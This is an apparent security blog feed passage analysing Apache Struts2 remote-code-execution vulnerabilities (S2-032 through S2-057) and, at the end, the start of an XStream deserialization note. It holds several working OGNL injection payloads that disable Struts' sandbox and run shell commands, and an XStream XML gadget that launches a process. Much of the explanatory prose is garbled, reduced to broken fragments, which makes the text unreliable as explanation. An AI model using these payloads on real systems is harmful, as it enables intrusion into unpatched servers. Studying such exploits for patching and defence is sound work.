class="comment">//localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// S2-037</span></span><br><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure><p><code>#parameters.command[0]</code><code>DefaultActionProxy</code>methodNameOGNL<code>#parameters</code></p><p><code>ognlUtil.getValue</code>methodName<code>()</code><code>()</code>POC<code>#xx.toString</code><code>()</code></p><h3 id="S2-032-S2-033"><a href="#S2-032-S2-033" class="headerlink" title="S2-032/S2-033"></a>S2-032/S2-033</h3><p><img src="/images/talk_about_struts2/image-20200520230704180.png" alt="image-20200520230704180"></p><p><code>xwork-core:2.3.28.1</code><code>OgnlUtil.isEvalExpression</code><code>isSequence</code></p><p><code>(1)?(2):(3)</code>OGNL<code>ASTTest</code></p><p><code>isEvalChain()</code><code>isSequence()</code><code>ASTEval</code><code>ASTSequence</code>ASTTest<code>isSequence</code><code>ASTTest</code>children<code>ASTSequence</code>ok</p><p>POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json</span><br></pre></td></tr></table></figure><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p><img src="/images/talk_about_struts2/image-20200520233839824.png" alt="image-20200520233839824"></p><p><code>name!method</code><code>cleanupActionName</code></p><p><img src="/images/talk_about_struts2/image-20200520233957407.png" alt="image-20200520233957407"></p><p><code>(#@)</code>OGNL</p><p>class</p><p><img src="/images/talk_about_struts2/image-20200520234647887.png" alt="image-20200520234647887"></p><p><a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>3DynamicMethodInvocation</p><p><code>name!method</code>rest<code>action/id/method</code></p><p><img src="/images/talk_about_struts2/image-20200521112254951.png" alt="image-20200521112254951"></p><p>POCrest-plugin</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure><h2 id="14-S2-045-S2-046"><a href="#14-S2-045-S2-046" class="headerlink" title="14. S2-045/S2-046"></a>14. S2-045/S2-046</h2><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>S2-046S2-045</p><p>2.32.52.3.312.5<a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p><p>struts2ActionProxyFilterDispatcher2.3<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>actionrequest</p><p></p><p><img src="/images/talk_about_struts2/image-20200521154143972.png" alt="image-20200521154143972"></p><p><code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code></p><p><img src="/images/talk_about_struts2/image-20200521154319856.png" alt="image-20200521154319856"></p><p><code>Content-Type: multipart/form-data</code><code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>S2-045</p><p><img src="/images/talk_about_struts2/image-20200521154524558.png" alt="image-20200521154524558"></p><p><code>JakartaMultiPartRequest</code>request<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>Content-Typemultipart/contentType</p><p><img src="/images/talk_about_struts2/image-20200521155036903.png" alt="image-20200521155036903"></p><p>struts2</p><p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p><p><img src="/images/talk_about_struts2/image-20200521155309089.png" alt="image-20200521155309089"></p><p><img src="/images/talk_about_struts2/image-20200521155346720.png" alt="image-20200521155346720"></p><p><code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p><p><img src="/images/talk_about_struts2/image-20200521155451100.png" alt="image-20200521155451100"></p><p><img src="/images/talk_about_struts2/image-20200521155901705.png" alt="image-20200521155901705"></p><p>message</p><p><img src="/images/talk_about_struts2/image-20200521155825583.png" alt="image-20200521155825583"></p><p><code>TextParseUtil.translateVariables</code>OGNL</p><p>OGNLOGNL</p><p>OGNL2.3.29<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`</p><p>S2-045POC</p><h3 id="POC-10"><a href="#POC-10" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">(#_='multipart/form-data').</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#_memberAccess?(#_memberAccess=#dm):</span><br><span class="line">(</span><br><span class="line">(#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">(#ognlUtil.getExcludedPackageNames().clear()).</span><br><span class="line">(#ognlUtil.getExcludedClasses().clear()).</span><br><span class="line">(#context.setMemberAccess(#dm)))).</span><br><span class="line">(#cmd='id').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).</span><br><span class="line">(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</span><br><span class="line">(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5-10SecurityMemberAccess<code>excludedClasses</code><code>SecurityMemberAccess.isAccessible</code></p><p>setters<code>SecurityMemberAccess</code></p><p><code>ognl.OgnlContext#setMemberAccess</code>contextOGNL<code>#context</code></p><p><code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>MemberAccess<code>#context</code></p><p><code>ExcludedPackageNames</code><code>ExcludedClasses</code></p><p><code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p><p><img src="/images/talk_about_struts2/image-20200521172344561.png" alt="image-20200521172344561"></p><p><code>securityMemberAccess</code><code>ognlUtil</code><code>ognlUtil</code><code>securityMemberAccess</code>jvm</p><p>POCstruts2containerognlUtil</p><p><code>#context.setMemberAccess</code></p><p></p><h3 id="-9"><a href="#-9" class="headerlink" title=""></a></h3><p><img src="/images/talk_about_struts2/image-20200521204140738.png" alt="image-20200521204140738"></p><p>messageargs</p><h2 id="15-S2-048"><a href="#15-S2-048" class="headerlink" title="15. S2-048"></a>15. S2-048</h2><p><a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p><h2 id="16-S2-052"><a href="#16-S2-052" class="headerlink" title="16. S2-052"></a>16. S2-052</h2><p>:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p><blockquote><p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p></blockquote><p>struts2restContentTypeInterceptorcontent-type</p><p><img src="/images/talk_about_struts2/image-20200522100814912.png" alt="image-20200522100814912"></p><p>xml<code>XStreamHandler</code></p><p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200522101114659.png" alt="image-20200522101114659"></p><p>requesthandler<code>application/xml</code><code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>xml</p><p><img src="/images/talk_about_struts2/image-20200522101244620.png" alt="image-20200522101244620"></p><p>1.4.8xstreamXStream</p><p>XML</p><h3 id="POC-11"><a href="#POC-11" class="headerlink" title="POC"></a>POC</h3><p>xmlysomapContent-Type<code>application/xml</code></p><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><p>S2-052OGNL</p><p>XStream1.4.10</p><p><img src="/images/talk_about_struts2/image-20200522102217477.png" alt="image-20200522102217477"></p><p><code>AllowedClasses</code><code>AllowedClassNames</code><code>XStreamPermissionProvider</code></p><p></p><p><img src="/images/talk_about_struts2/image-20200522102927472.png" alt="image-20200522102927472"></p><p>XStream</p><h2 id="17-S2-053"><a href="#17-S2-053" class="headerlink" title="17. S2-053"></a>17. S2-053</h2><p>:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p><p>S2-053freemarker</p><p><img src="/images/talk_about_struts2/image-20200522103937515.png" alt="image-20200522103937515"></p><p>actionfreemarkerfreemarker</p><p><img src="/images/talk_about_struts2/image-20200522111039529.png" alt="image-20200522111039529"></p><p>freemarker<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p><p><img src="/images/talk_about_struts2/image-20200522111238176.png" alt="image-20200522111238176"></p><p>url<code>org.apache.struts2.components.URL#start</code></p><p><img src="/images/talk_about_struts2/image-20200522111315111.png" alt="image-20200522111315111"></p><p><code>ServletUrlRenderer</code>OGNLS2-013<code>TextParseUtil.translateVariables</code></p><h3 id="POC-12"><a href="#POC-12" class="headerlink" title="POC"></a>POC</h3><p>pocS2-045poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"><span class="comment">// </span></span><br></pre></td></tr></table></figure><h3 id="-11"><a href="#-11" class="headerlink" title=""></a></h3><blockquote><p>FreemarkerManager</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;  LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);</span><br><span class="line">&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>TemplateClassResolver.SAFER_RESOLVER)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>freemarkerRCEfreemarker</p></blockquote><p><a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p><h2 id="18-S2-055"><a href="#18-S2-055" class="headerlink" title="18. S2-055"></a>18. S2-055</h2><p>Struts 2.5 - Struts 2.5.14</p><p>S2-055S2-052jacksonjsonjacksonjsonstruts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"jackson"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.JacksonLibHandler"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.rest.handlerOverride.json"</span> <span class="attr">value</span>=<span class="string">"jackson"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>jacksonjackson</p><p>xstream</p><p><a href="http://xxlegend.com/2017/12/06/S2-055/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><h2 id="19-S2-057"><a href="#19-S2-057" class="headerlink" title="19. S2-057"></a>19. S2-057</h2><p>Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p><blockquote><p>82213ApacheStruts2CVE-2018-11776xmlnamespaceupper action(s) configurationsnamespace valueactionurlupper action(s) configurationsnamespace</p><p><a href="https://paper.seebug.org/682/" target="_blank" rel="noopener">https://paper.seebug.org/682/</a></p></blockquote><p></p><p><img src="/images/talk_about_struts2/image-20200522152919691.png" alt="image-20200522152919691"></p><p>namespaces2057.actiontest.actionredirectAction</p><p><img src="/images/talk_about_struts2/image-20200522153229727.png" alt="image-20200522153229727"></p><p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200522153556365.png" alt="image-20200522153556365"></p><p><code>ServletActionRedirectResult</code>namespacelocation<code>/s2vuls/${1*2}/s2057.action</code>,namespace<code>/${1*2}</code>,actionNametestlocation<code>/${1*2}/test.action</code>OGNL</p><p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p><p><img src="/images/talk_about_struts2/image-20200522154209594.png" alt="image-20200522154209594"></p><p>S2-012</p><p><img src="/images/talk_about_struts2/image-20200522154315511.png" alt="image-20200522154315511"></p><p><code>TextParseUtil.translateVariables</code>OGNL.getValue</p><h3 id="POC-13"><a href="#POC-13" class="headerlink" title="POC"></a>POC</h3><p>2.3.xS2-045poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action</span><br></pre></td></tr></table></figure><p>2.5.x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#ct=#request['struts.valueStack'].context).</span><br><span class="line">(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">(#ou.setExcludedClasses('')).</span><br><span class="line">(#ou.setExcludedPackageNames('')).</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#ct.setMemberAccess(#dm)).(#cmd='whoami').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc7</p><p><a href="https://paper.seebug.org/794/#35-struts-2516" target="_blank" rel="noopener">https://paper.seebug.org/794/#35-struts-2516</a></p><p>struts2 2.5.13ognl3.1.12-&gt;3.1.15<code>context.map</code>OgnlContextgetputremovecontext</p><p>excludedclear</p><p></p><blockquote><p>:</p><ul><li><code>context.map</code><code>attr</code><code>attr</code><code>context</code><code>attr</code><code>context.map</code></li><li><code>excludedClasses</code><code>clear</code><code>setter</code><code>excludedClasses</code></li><li><code>DefaultMemberAccess</code><code>_memberAccess</code></li></ul><p><code>OgnlUtil</code><code>setExcludedClasses</code><code>setExcludedPackageNames</code>OgnlUtil<code>_memberAccess</code><code>createAction</code><code>setOgnlUtil</code><code>MemberAccess</code><code>_memberAccess</code><code>OgnlUtil</code><code>_memberAccess</code><code>_memberAccess</code></p><p><code>OgnlUitl</code><code>_memberAccess</code><code>_memberAccess</code><code>DefaultMemberAccess</code></p></blockquote><p>poccontext3 4 5 6excluded2.5.xpoc<code>_memberAccess</code></p><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><hr><p>XD</p><p>s2lgtmcodeqlS2-057</p><p>ognlognlRCE</p><p><a href="https://paper.seebug.org/users/author/?nickname=lucifaer" target="_blank" rel="noopener">lucifaer</a></p><p></p><ol><li>struts2 2.3.14.1ognl2.3.14.1<code>SecurityMemberAccess</code><code>allowStaticMethodAccess=false</code>ognltruefinal</li><li>struts2 2.3.20<code>allowStaticMethodAccess</code>2.3.20</li><li>struts2 2.3.29<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`2.3.29</li><li>struts2 2.3.34/2.5.16container<code>ognlUtil</code>S2-045context.mapexcludedClassesclear</li><li>struts2 2.5.17requestcontextcontext.mapS2-057ognlstack</li><li>lucifaer</li></ol><p>struts2struts</p><p>XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesXStream</title>
      <link href="2020/04/18/java/talk-about-xstream-deserialization/"/>
      <url>2020/04/18/java/talk-about-xstream-deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><hr><p><a href="https://x-stream.github.io/" target="_blank" rel="noopener">XStream</a>objectXMLXStreamXD</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><hr><p>XStream<code>toXML</code><code>fromXML</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"tom"</span>, <span class="number">18</span>);</span><br><span class="line">XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">String xml = xStream.toXML(person);<span class="comment">// object to xml</span></span><br><span class="line">System.out.println(xml);</span><br><span class="line">System.out.println(xStream.fromXML(xml)); <span class="comment">// xml to object</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// &lt;objects.Person&gt;</span></span><br><span class="line"><span class="comment">//   &lt;name&gt;tom&lt;/name&gt;</span></span><br><span class="line"><span class="comment">//   &lt;age&gt;18&lt;/age&gt;</span></span><br><span class="line"><span class="comment">// &lt;/objects.Person&gt;</span></span><br><span class="line"><span class="comment">// objects.Person@369f73a2</span></span><br></pre></td></tr></table></figure><p>XStreamfromXML<a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener"></a>XStreamConverters</p><p>XStreamfastjsonfastjsongetterssettersXStreamJava</p><p>java<code>HashMap</code><code>PriorityQueue</code>key<code>hashCode</code><code>equal</code><code>compareTo</code></p><p>XStreamMapConverter</p><h2 id="1-MapConverter"><a href="#1-MapConverter" class="headerlink" title="1. MapConverter"></a>1. MapConverter</h2><p>MapConverter</p><p><code>com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414231833562.png" alt="image-20200414231833562"></p><p><code>populateMap</code>put</p><p><code>com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414231951807.png" alt="image-20200414231951807"></p><p>targetMapputkeyhashCode</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414232218889.png" alt="image-20200414232218889"></p><h2 id="2-TreeSet-TreeMapConverter"><a href="#2-TreeSet-TreeMapConverter" class="headerlink" title="2. TreeSet/TreeMapConverter"></a>2. TreeSet/TreeMapConverter</h2><p>TreeSetTreeMapTreeSetKeyTreeMapTreeSetConverterTreeMapConverterTreeSetTreeMapTreeSet</p><p>TreeSetConverter</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142144637.png" alt="image-20200415142144637"></p><p>treesetfield treemapTreeMapConverterTreeMap</p><p><code>com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142431953.png" alt="image-20200415142431953"></p><p>soredMapEntry<code>TreeMap.putAll</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142913714.png" alt="image-20200415142913714"></p><p><code>java.util.AbstractMap#putAll</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415143058176.png" alt="image-20200415143058176"></p><p>put<code>TreeMap.put</code>,keykeykey<code>compareTo</code></p><h2 id="3-DynamicProxyConverter"><a href="#3-DynamicProxyConverter" class="headerlink" title="3. DynamicProxyConverter"></a>3. DynamicProxyConverter</h2><p>XStream</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415162242443.png" alt="image-20200415162242443"></p><p>Proxy<code>EventHandler</code></p><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><p>ConverterXStream</p><h2 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h2><p>XStream<code>EventHandler</code><code>invoke</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415162715854.png" alt="image-20200415162715854"></p><p><code>invokeInternal</code></p><p><code>hashCode</code><code>equals</code><code>toString</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415163231155.png" alt="image-20200415163231155"></p><p><code>invokeInternal</code>3<strong><code>Map</code></strong><code>TreeSet</code><code>compareTo</code></p><p></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415170159510.png" alt="image-20200415170159510"></p><p>javatargetaction</p><p>action452461</p><ol><li></li><li><code>Comparable</code>action</li></ol><p>2</p><ul><li>cmd<code>ProcessBuilder</code>action<code>start</code></li><li>rmi url<code>JdbcRowSetImpl</code>action<code>getDatabaseMetaData</code>getters</li></ul><p><a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/EventHandler.java" target="_blank" rel="noopener">POC</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span> <span class="comment">&lt;!-- Proxy handlerEventHandler --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>/System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h2><p><strong></strong>groovy &lt;= 2.4.3<code>MethodClosure</code></p><p><code>EventHandler</code>Groovy<code>ConvertedClosure</code></p><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><p>MethodClosure</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> MethodClosure(Runtime.getRuntime(), <span class="string">"exec"</span>);</span><br></pre></td></tr></table></figure><p><code>Runtime</code><code>exec</code></p><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" 